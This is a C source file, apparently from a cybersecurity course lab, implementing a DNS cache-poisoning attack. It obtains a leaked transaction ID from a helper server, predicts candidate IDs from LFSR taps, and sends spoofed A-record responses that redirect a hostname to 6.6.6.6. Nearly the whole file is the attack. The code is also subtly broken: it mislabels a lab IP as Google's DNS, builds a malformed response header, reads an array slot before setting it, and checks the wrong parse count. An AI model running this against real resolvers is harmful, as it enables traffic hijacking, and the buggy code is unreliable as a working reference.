#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define DNS_SERVER_IP "192.168.1.203" // Google's public DNS server
#define DNS_SERVER_PORT 53      // Standard DNS port
#define BUFFER_SIZE 512         // Buffer size for the DNS query and response
#define INFO_SERVER_IP "192.168.1.201" // Server providing initial information
#define INFO_SERVER_PORT 4444          // Port for receiving info
#define TAP1 0x80000057
#define TAP2 0x80000062

int build_dns_query(unsigned char *buffer, const char *hostname);

// Structure for DNS header and response construction
int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid) {
    int response_len = 0;

    // DNS Header (same as the query but with a different txid and response flags)
    uint32_t txid_network = htons(txid); 
    unsigned short flags = htons(0x8180);  // Standard query response, no error
    unsigned short q_count = htons(1);     // 1 question
    unsigned short ans_count = htons(1);   // 1 answer
    unsigned short auth_count = 0;
    unsigned short add_count = 0;

    // Copy the query into the buffer
    memcpy(buffer, query, query_len);
    response_len = query_len;

    // Header section for response
    memcpy(buffer + response_len, &txid_network, 2);
    response_len += 2;
    memcpy(buffer + response_len, &flags, 2);
    response_len += 2;
    memcpy(buffer + response_len, &q_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &ans_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &auth_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &add_count, 2);
    response_len += 2;

    // Copy the question section as is (hostname format and type)
    // This is the same question section as in the query, no changes
    memcpy(buffer + response_len, query + 12, query_len - 12);
    response_len += query_len - 12;

    // Answer section: Hostname -> A record (IP: 6.6.6.6)
    unsigned short type = htons(1);  // Type A (IPv4 address)
    unsigned short _class = htons(1); // Class IN (Internet)
    unsigned int ttl = htonl(300);    // Time-to-live: 300 seconds
    unsigned short data_len = htons(4); // Length of the IP address

    // A record data (IP address 6.6.6.6)
    unsigned char ip_address[] = { 6, 6, 6, 6 };

    // Write answer
    memcpy(buffer + response_len, &type, 2);
    response_len += 2;
    memcpy(buffer + response_len, &_class, 2);
    response_len += 2;
    memcpy(buffer + response_len, &ttl, 4);
    response_len += 4;
    memcpy(buffer + response_len, &data_len, 2);
    response_len += 2;
    memcpy(buffer + response_len, ip_address, 4);
    response_len += 4;

    return response_len;
}

// Function to send the spoofed DNS response
void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *destination_ip, int destination_port) {
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Step 2: Configure the server address for sending the spoofed response
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(destination_port);
    inet_pton(AF_INET, destination_ip, &server_addr.sin_addr);

    // Step 3: Assume we already have the DNS query (this would normally come from the client)
    unsigned char query[BUFFER_SIZE];
    int query_len = build_dns_query(query, hostname);  

    // Step 4: Build the DNS response
    int response_len = build_dns_response(buffer, query, query_len, txid);

    // Step 5: Send the spoofed DNS response
    if (sendto(sockfd, buffer, response_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send spoofed DNS response");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Spoofed DNS response sent for hostname: %s with IP: 6.6.6.6\n", hostname);
    close(sockfd);
}

// Function to fill the txid_ls with the 10 possible txid
void fill_txids(uint32_t *txid_ls, uint32_t txid){
    // if the LSbit of r_1 = LSbit r_2 = 0 
    txid_ls[8] = txid >> 1;
    // set the left most bit of txid_ls[0] to 1, txid is 32 bits
    txid_ls[9] = txid_ls[0] | 0x80000000;

    // else if the LSbit of r_1 = LSbit r_2 = 1
    for (int i = 0; i < 4; i ++) {
        txid_ls[i] = ((((txid >> 1) ^ TAP1 ^ TAP2) >> 1) ^ TAP1 ^ TAP2) | (30<<i);
    }
    
    for (int i = 0; i < 4; i ++) {
        txid_ls[4 + i] = (((txid >> 1) ^ TAP1 ^ TAP2) >> 1) | (30<<i);
    }
}
    
int socket_creation(struct sockaddr_in *server_addr){
    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure the server address
    printf("configure the server address \n");
    memset(server_addr, 0, sizeof(*server_addr));
    (*server_addr).sin_family = AF_INET;
    (*server_addr).sin_port = htons(INFO_SERVER_PORT);
    inet_pton(AF_INET, INFO_SERVER_IP, &server_addr->sin_addr);

    // Connect to the server
    printf("connect to the server\n");
    if (connect(sockfd, (struct sockaddr *)server_addr, sizeof(*server_addr)) < 0) {
        perror("Connection to info server failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    return sockfd;
}

// Function to communicate with the info server and get the txid
void run_attack(uint32_t *txid_ls) {
    // connect to server attacker
    int sockfd1;
    struct sockaddr_in server_addr1;
    char txid_buffer[BUFFER_SIZE];
    uint32_t txid = 0;
    unsigned int source_port = 0;

    sockfd1 = socket_creation(&server_addr1);
    
    printf("Attacker server connected: %s:%d\n", inet_ntoa(server_addr1.sin_addr), ntohs(server_addr1.sin_port));
    
    // send the DNS request  ################ step 1 #####################
    const char *hostname = "www.attacker.cybercourse.com";
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    // Step 2: Configure the DNS server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_SERVER_PORT);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
    printf("step 2 done\n");
    // Step 3: Build the DNS query
    int query_len = build_dns_query(buffer, hostname);
    printf("step 3 done\n");
    // Step 4: Send the DNS query
    if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send DNS query");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("DNS query sent for hostname: %s\n", hostname);
    printf("waiting for txid\n");
    // Receive the txid from the server
    int bytes_received = recv(sockfd1, txid_buffer, BUFFER_SIZE - 1, 0); // fix this
    if (bytes_received < 0) {
        perror("Failed to receive data from info server");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    txid_buffer[bytes_received] = '\0'; // Null-terminate the received string
    printf("Received from server: %s\n", txid_buffer);

    // Parse the txid
    if (sscanf(txid_buffer, "TXID: %u, Source Port: %u", &txid, &source_port) != 1) {
        fprintf(stderr, "Failed to parse TXID from server response\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Extracted TXID: %u\n", txid);
    printf("source port : %u\n", source_port);
    fill_txids(txid_ls, txid);
    for (int i = 0; i < 10; i++) {
        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port);
    }
    
    // Close the connection
    close(sockfd);
    close(sockfd1);
}


// Function to build a DNS query
int build_dns_query(unsigned char *buffer, const char *hostname) {
    int query_len = 0;
    uint32_t txid = htons(0x1234); // Transaction ID
    unsigned short flags = htons(0x0100); // Standard query
    unsigned short q_count = htons(1);   // 1 question
    unsigned short ans_count = 0;        // No answers
    unsigned short auth_count = 0;       // No authority
    unsigned short add_count = 0;        // No additional

    // Header section
    memcpy(buffer + query_len, &txid, 2);
    query_len += 2;
    memcpy(buffer + query_len, &flags, 2);
    query_len += 2;
    memcpy(buffer + query_len, &q_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &ans_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &auth_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &add_count, 2);
    query_len += 2;
    printf("got here \n");
    // Question section (convert hostname to DNS format)
    char buffer2[512];
    strcpy(buffer2, hostname);
    const char *token = strtok((char *)buffer2, ".");
    printf("got here \n");
    while (token) {
        size_t len = strlen(token);
        buffer[query_len++] = (unsigned char)len;
        memcpy(buffer + query_len, token, len);
        query_len += len;
        token = strtok(NULL, ".");
        printf("got here \n");
    }

    buffer[query_len++] = 0; // End of hostname

    // Question Type (A record)
    unsigned short qtype = htons(1); // Type A
    memcpy(buffer + query_len, &qtype, 2);
    query_len += 2;

    // Question Class (IN)
    unsigned short qclass = htons(1); // Class IN
    memcpy(buffer + query_len, &qclass, 2);
    query_len += 2;

    return query_len;
}

// Function to send the DNS query 
void send_dns_query(const char *hostname) {
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    // Step 2: Configure the DNS server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_SERVER_PORT);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
    printf("step 2 done\n");
    // Step 3: Build the DNS query
    int query_len = build_dns_query(buffer, hostname);
    printf("step 3 done\n");
    // Step 4: Send the DNS query
    if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send DNS query");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("DNS query sent for hostname: %s\n", hostname);

    // Step 5: Receive the DNS response
    socklen_t server_addr_len = sizeof(server_addr);
    int response_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&server_addr, &server_addr_len);
    if (response_len < 0) {
        perror("Failed to receive DNS response");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("DNS response received (%d bytes).\n", response_len);

    // Optional: Print the raw DNS response
    printf("Raw DNS Response:\n");
    for (int i = 0; i < response_len; i++) {
        printf("%02x ", buffer[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    // Step 6: Close the socket
    close(sockfd);
}

int main() {
    uint32_t txid[10];

    // Step 1: Get the TXID from the info server
    run_attack(txid);

    //send_dns_query(hostname);
    return 0;
}

